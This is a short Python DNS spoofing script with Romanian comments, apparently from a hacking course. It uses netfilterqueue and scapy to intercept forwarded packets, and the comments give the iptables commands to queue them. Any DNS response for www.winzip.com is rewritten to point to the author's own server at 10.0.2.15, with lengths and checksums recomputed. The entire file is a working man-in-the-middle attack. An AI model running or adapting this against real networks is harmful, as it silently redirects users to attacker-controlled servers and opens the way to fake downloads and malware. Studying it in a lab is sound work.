#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# iptables -I FORWAR -j NFQUEUE --queue-num 0 -- comanda care pune in coada 0 tate pachetele primite
# iptables -I INPUT/OUTPUT -j NFQUEUE --queue-num 0 -- comandadaca vrem sa testam pe masina locala
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR): #locking for a dns response

        domain_name = scapy_packet[scapy.DNSQR].qname
        if 'www.winzip.com' in domain_name:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=domain_name, rdata='10.0.2.15') # my apache server
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # remove de check sum fields and len fields to recompute when scapy sends the packet
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


